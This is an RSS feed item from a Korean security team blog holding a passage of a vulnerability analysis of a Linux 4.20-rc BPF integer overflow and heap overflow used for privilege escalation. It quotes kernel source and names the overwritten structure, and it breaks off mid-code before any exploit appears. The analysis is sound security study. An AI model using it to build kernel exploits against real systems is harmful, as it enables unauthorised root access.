<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Defenit 블로그</title>
    <link>https://defenit.kr/</link>
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>Team Defenit Blog</description>
    <pubDate>Tue, 03 Dec 2019 10:00:06 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[1-day Analysis] Linux kernel BPF interger overflow &amp; heap overflow</title>
      <link>https://defenit.kr/2019/12/03/Pwn/%E3%84%B4%20Research/linux-kenel-bpf/</link>
      <guid>https://defenit.kr/2019/12/03/Pwn/%E3%84%B4%20Research/linux-kenel-bpf/</guid>
      <pubDate>Tue, 03 Dec 2019 09:52:29 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;목차&quot;&gt;&lt;a href=&quot;#목차&quot; class=&quot;headerlink&quot; title=&quot;목차&quot;&gt;&lt;/a&gt;목차&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;서론&lt;/li&gt;
&lt;li&gt;BPF 모듈&lt;/li&gt;
&lt;li&gt;주요 데이터 구조&lt;/li&gt;
&lt;li&gt;integer overflow&lt;
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h2><ul><li>서론</li><li>BPF 모듈</li><li>주요 데이터 구조</li><li>integer overflow</li><li>heap overflow<ul><li>작은 힙 할당</li><li>heap overflow trigger</li><li>victim structure</li></ul></li><li>exploit<ul><li>취약점 체이닝</li><li>debugging</li></ul></li><li>reference</li></ul><hr><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p><a href="https://github.com/ww9210/kernel4.20_bpf_LPE" target="_blank" rel="noopener">ww9210</a>이 2018/11/22에 bpf 모듈에서 integer overflow로 heap overflow를 트리거해 lpe를 터트리는 취약점을 리눅스 커뮤니티에 제출했습니다.</p><p>처음 해보는 리눅스 커널 1-day 분석이여서 모듈 분석과 익스플로잇 이해, 디버깅에 적지 않은 시간이 소모되었지만 분석을 진행하면서 많은 공부가 되었기에 정리할 겸 1-day 분석글을 작성해보도록 하겠습니다.</p><p>해당 취약점은 리눅스 커널 <code>v4.20-rc1</code>, <code>v4.20-rc2</code>, <code>v4.20-rc3</code>, <code>v4.20-rc4</code> 에서 트리거할 수 있으며 1-day 분석은 <code>v4.20-rc1</code> 소스 코드 기준으로 하였습니다.</p><hr><h2 id="BPF-모듈"><a href="#BPF-모듈" class="headerlink" title="BPF 모듈"></a>BPF 모듈</h2><h5 id="bpf"><a href="#bpf" class="headerlink" title="bpf()"></a>bpf()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span>;</span><br></pre></td></tr></table></figure><p><code>BPF(Berkeley Packet Filter)</code>는 사용자 모드에서 네트워크 패킷 필터링에 사용되는 모듈이자 kernel level에서 동작하는 경량화된 가상 머신입니다.</p><p>이와 같이 전통적으로 네트워크 패킷 필터링으로 사용되는 모듈을 <code>cBPF(classic BPF)</code>로 정의하고 여기서 더 많은 리소스들을 추가해 더 다양한 용도로 사용되는 모듈을 <code>eBPF(extended BPF)</code>로 정의합니다.</p><p>리눅스 커널 v3.18 이후에 추가된 BPF syscall은 모두 eBPF이며 cBPF는 일부에서만 사용됩니다.</p><h5 id="bpf-syscall"><a href="#bpf-syscall" class="headerlink" title="bpf syscall"></a>bpf syscall</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(bpf, <span class="keyword">int</span>, cmd, <span class="keyword">union</span> bpf_attr __user *, uattr, <span class="keyword">unsigned</span> <span class="keyword">int</span>, size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">union</span> bpf_attr attr = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sysctl_unprivileged_bpf_disabled &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">err = bpf_check_uarg_tail_zero(uattr, <span class="keyword">sizeof</span>(attr), size);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">size = <span class="keyword">min_t</span>(u32, size, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;attr, uattr, size) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">err = security_bpf(cmd, &amp;attr, size);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_CREATE:</span><br><span class="line">err = map_create(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_LOOKUP_ELEM:</span><br><span class="line">err = map_lookup_elem(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_UPDATE_ELEM:</span><br><span class="line">err = map_update_elem(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_DELETE_ELEM:</span><br><span class="line">err = map_delete_elem(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_GET_NEXT_KEY:</span><br><span class="line">err = map_get_next_key(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_PROG_LOAD:</span><br><span class="line">err = bpf_prog_load(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_OBJ_PIN:</span><br><span class="line">err = bpf_obj_pin(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_OBJ_GET:</span><br><span class="line">err = bpf_obj_get(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_PROG_ATTACH:</span><br><span class="line">err = bpf_prog_attach(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_PROG_DETACH:</span><br><span class="line">err = bpf_prog_detach(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_PROG_QUERY:</span><br><span class="line">err = bpf_prog_query(&amp;attr, uattr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_PROG_TEST_RUN:</span><br><span class="line">err = bpf_prog_test_run(&amp;attr, uattr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_PROG_GET_NEXT_ID:</span><br><span class="line">err = bpf_obj_get_next_id(&amp;attr, uattr,</span><br><span class="line">  &amp;prog_idr, &amp;prog_idr_lock);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_GET_NEXT_ID:</span><br><span class="line">err = bpf_obj_get_next_id(&amp;attr, uattr,</span><br><span class="line">  &amp;map_idr, &amp;map_idr_lock);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_PROG_GET_FD_BY_ID:</span><br><span class="line">err = bpf_prog_get_fd_by_id(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_GET_FD_BY_ID:</span><br><span class="line">err = bpf_map_get_fd_by_id(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_OBJ_GET_INFO_BY_FD:</span><br><span class="line">err = bpf_obj_get_info_by_fd(&amp;attr, uattr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_RAW_TRACEPOINT_OPEN:</span><br><span class="line">err = bpf_raw_tracepoint_open(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_BTF_LOAD:</span><br><span class="line">err = bpf_btf_load(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_BTF_GET_FD_BY_ID:</span><br><span class="line">err = bpf_btf_get_fd_by_id(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_TASK_FD_QUERY:</span><br><span class="line">err = bpf_task_fd_query(&amp;attr, uattr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_LOOKUP_AND_DELETE_ELEM:</span><br><span class="line">err = map_lookup_and_delete_elem(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>일반적으로 BPF 모듈은 유저 모드에서 위와 같이 <code>bpf()</code> syscall로 호출할 수 있습니다.</p><p>모듈의 여러 기능 중 익스에 이용할 기능은 <code>BPF_MAP_CREATE</code>와 <code>BPF_MAP_UPDATE_ELEM</code> 입니다.</p><p><code>BPF_MAP_CREATE</code> 기능은 <code>eBPF map</code>을 생성하고 해당 맵을 가르키는 <code>file descriptor</code>를 반환합니다. 여기서 <code>eBPF map</code>이란 커널 공간과 유저 공간 사이에서의 데이터 공유등의 용도로 사용되는 자료 구조입니다.</p><p><code>BPF_MAP_UPDATE_ELEM</code> 기능은 인자로 넘긴 <code>fd</code>에 해당하는 맵에서 특정 항목을 생성, 수정할 수 있습니다.</p><hr><h2 id="주요-데이터-구조"><a href="#주요-데이터-구조" class="headerlink" title="주요 데이터 구조"></a>주요 데이터 구조</h2><p>해당 취약점을 트리거하기 위해 사용되는 BPF 모듈의 주요 데이터 구조는 다음과 같습니다.</p><h5 id="struct-bpf-queue-stack"><a href="#struct-bpf-queue-stack" class="headerlink" title="struct bpf_queue_stack"></a>struct bpf_queue_stack</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line">    <span class="keyword">raw_spinlock_t</span> lock;</span><br><span class="line">    u32 head, tail;</span><br><span class="line">    u32 size; <span class="comment">/* max_entries + 1 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> elements[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>bpf_queue_stack</code> 구조체는 커널 힙에 할당되는 <code>eBPF map</code> 자료 구조의 헤더 부분으로 데이터 구조에 대한 관리를 담당합니다.</p><h5 id="struct-bpf-map"><a href="#struct-bpf-map" class="headerlink" title="struct bpf_map"></a>struct bpf_map</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line">    <span class="comment">/* The first two cachelines with read-mostly members of which some</span></span><br><span class="line"><span class="comment">     * are also accessed in fast-path (e.g. ops, max_entries).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">enum</span> bpf_map_type map_type;</span><br><span class="line">    u32 key_size;</span><br><span class="line">    u32 value_size;</span><br><span class="line">    u32 max_entries;</span><br><span class="line">    u32 map_flags;</span><br><span class="line">    u32 pages;</span><br><span class="line">    u32 id;</span><br><span class="line">    <span class="keyword">int</span> numa_node;</span><br><span class="line">    u32 btf_key_type_id;</span><br><span class="line">    u32 btf_value_type_id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> unpriv_array;</span><br><span class="line">    <span class="comment">/* 55 bytes hole */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span></span><br><span class="line"><span class="comment">     * particularly with refcounting.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line">    <span class="keyword">atomic_t</span> refcnt;</span><br><span class="line">    <span class="keyword">atomic_t</span> usercnt;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>bpf_map</code> 구조체는 <code>bpf_queue_stack</code> 구조체의 첫 번째 멤버로써, 생성된 맵에 대한 구체적인 정보가 담겨있습니다.</p><p>추후 맵 초기화 과정에서 <code>bpf_map_init_from_attr()</code> 함수에 의해 <code>*attr</code> 인자의 정보가 해당 구조체로 복사됩니다.</p><h5 id="struct-bpf-map-ops"><a href="#struct-bpf-map-ops" class="headerlink" title="struct bpf_map_ops"></a>struct bpf_map_ops</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> &#123;</span></span><br><span class="line">    <span class="comment">/* funcs callable from userspace (via syscall) */</span></span><br><span class="line">    <span class="keyword">int</span> (*map_alloc_check)(<span class="keyword">union</span> bpf_attr *attr);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *(*<span class="title">map_alloc</span>)(<span class="title">union</span> <span class="title">bpf_attr</span> *<span class="title">attr</span>);</span></span><br><span class="line">    <span class="keyword">void</span> (*map_release)(struct bpf_map *<span class="built_in">map</span>, struct file *map_file);</span><br><span class="line">    <span class="keyword">void</span> (*map_free)(struct bpf_map *<span class="built_in">map</span>);</span><br><span class="line">    <span class="keyword">int</span> (*map_get_next_key)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *next_key);</span><br><span class="line">    <span class="keyword">void</span> (*map_release_uref)(struct bpf_map *<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* funcs callable from userspace and from eBPF programs */</span></span><br><span class="line">    <span class="keyword">void</span> *(*map_lookup_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line">    <span class="keyword">int</span> (*map_update_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *value, u64 flags);</span><br><span class="line">    <span class="keyword">int</span> (*map_delete_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line">    <span class="keyword">int</span> (*map_push_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value, u64 flags);</span><br><span class="line">    <span class="keyword">int</span> (*map_pop_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value);</span><br><span class="line">    <span class="keyword">int</span> (*map_peek_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* funcs called by prog_array and perf_event_array map */</span></span><br><span class="line">    <span class="keyword">void</span> *(*map_fd_get_ptr)(struct bpf_map *<span class="built_in">map</span>, struct file *map_file,</span><br><span class="line">                <span class="keyword">int</span> fd);</span><br><span class="line">    <span class="keyword">void</span> (*map_fd_put_ptr)(<span class="keyword">void</span> *ptr);</span><br><span class="line">    u32 (*map_gen_lookup)(struct bpf_map *<span class="built_in">map</span>, struct bpf_insn *insn_buf);</span><br><span class="line">    u32 (*map_fd_sys_lookup_elem)(<span class="keyword">void</span> *ptr);</span><br><span class="line">    <span class="keyword">void</span> (*map_seq_show_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key,</span><br><span class="line">                  struct seq_file *m);</span><br><span class="line">    <span class="keyword">int</span> (*map_check_btf)(<span class="keyword">const</span> struct bpf_map *<span class="built_in">map</span>,</span><br><span class="line">                 <span class="keyword">const</span> struct btf_type *key_type,</span><br><span class="line">                 <span class="keyword">const</span> struct btf_type *value_type);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>bpf_map_ops</code> 구조체는 <code>bpf_map</code> 구조체의 멤버로 생성된 맵에 대한 함수 포인터들이 담겨있는 구조체입니다.</p><p>여타 모듈의 <code>file_operations</code>과 비슷한 역할을 하며, 이번 익스에서 heap overflow로 덮어 권한 상승을 트리거하게 될 구조체입니다.</p><h5 id="union-bpf-attr"><a href="#union-bpf-attr" class="headerlink" title="union bpf_attr"></a>union bpf_attr</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* anonymous struct used by BPF_MAP_CREATE command */</span></span><br><span class="line">__u32map_type;<span class="comment">/* one of enum bpf_map_type */</span></span><br><span class="line">__u32key_size;<span class="comment">/* size of key in bytes */</span></span><br><span class="line">__u32value_size;<span class="comment">/* size of value in bytes */</span></span><br><span class="line">__u32max_entries;<span class="comment">/* max number of entries in a map */</span></span><br><span class="line">__u32map_flags;<span class="comment">/* BPF_MAP_CREATE related</span></span><br><span class="line"><span class="comment"> * flags defined above.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__u32inner_map_fd;<span class="comment">/* fd pointing to the inner map */</span></span><br><span class="line">__u32numa_node;<span class="comment">/* numa node (effective only if</span></span><br><span class="line"><span class="comment"> * BPF_F_NUMA_NODE is set).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>map_name[BPF_OBJ_NAME_LEN];</span><br><span class="line">__u32map_ifindex;<span class="comment">/* ifindex of netdev to create on */</span></span><br><span class="line">__u32btf_fd;<span class="comment">/* fd pointing to a BTF type data */</span></span><br><span class="line">__u32btf_key_type_id;<span class="comment">/* BTF type_id of the key */</span></span><br><span class="line">__u32btf_value_type_id;<span class="comment">/* BTF type_id of the value */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* anonymous struct used by BPF_MAP_*_ELEM commands */</span></span><br><span class="line">__u32map_fd;</span><br><span class="line">__aligned_u64key;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">__aligned_u64 value;</span><br><span class="line">__aligned_u64 next_key;</span><br><span class="line">&#125;;</span><br><span class="line">__u64flags;</span><br><span class="line">&#125;;</span><br><span class="line">  ....</span><br></pre></td></tr></table></figure><p><code>bpf()</code> syscall의 <code>*attr</code> 인자로 사용되는 공용체입니다. 해당 공용체의 멤버는 <code>cmd</code> 인자 기준으로 호출된 기능들에 따라 선택되는 <code>anonymous struct</code>로 구성되어 있습니다.</p><hr><h2 id="integer-overflow"><a href="#integer-overflow" class="headerlink" title="integer overflow"></a>integer overflow</h2><p>integer overflow 취약점은 <code>BPF_MAP_CREATE</code> 기능에서 찾을 수 있습니다.</p><h5 id="map-create"><a href="#map-create" class="headerlink" title="map_create()"></a>map_create()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_create</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">int</span> f_flags;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = CHECK_ATTR(BPF_MAP_CREATE);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">f_flags = bpf_get_file_flag(attr-&gt;map_flags);</span><br><span class="line"><span class="keyword">if</span> (f_flags &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> f_flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (numa_node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)numa_node &gt;= nr_node_ids ||</span><br><span class="line">     !node_online(numa_node)))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span></span><br><span class="line"><span class="built_in">map</span> = find_and_alloc_map(attr);    <span class="comment">// here</span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>eBPF의 <code>BPF_MAP_CREATE</code> 기능을 사용할 경우 <code>/kernel/bpf/syscall.c</code>에 있는 <code>map_create()</code> 함수가 호출됩니다.</p><p>해당 함수의 <code>map = find_and_alloc_map(attr);</code> 부분에서 <code>find_and_alloc_map()</code> 함수를 호출하는 것을 확인할 수 있습니다.</p><h5 id="queue-map-ops"><a href="#queue-map-ops" class="headerlink" title="queue_map_ops"></a>queue_map_ops</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">queue_map_ops</span> = &#123;</span></span><br><span class="line">    .map_alloc_check = queue_stack_map_alloc_check,</span><br><span class="line">    .map_alloc = queue_stack_map_alloc,</span><br><span class="line">    .map_free = queue_stack_map_free,</span><br><span class="line">    .map_lookup_elem = queue_stack_map_lookup_elem,</span><br><span class="line">    .map_update_elem = queue_stack_map_update_elem,</span><br><span class="line">    .map_delete_elem = queue_stack_map_delete_elem,</span><br><span class="line">    .map_push_elem = queue_stack_map_push_elem,</span><br><span class="line">    .map_pop_elem = queue_map_pop_elem,</span><br><span class="line">    .map_peek_elem = queue_map_peek_elem,</span><br><span class="line">    .map_get_next_key = queue_stack_map_get_next_key,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="find-and-alloc-map"><a href="#find-and-alloc-map" class="headerlink" title="find_and_alloc_map()"></a>find_and_alloc_map()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 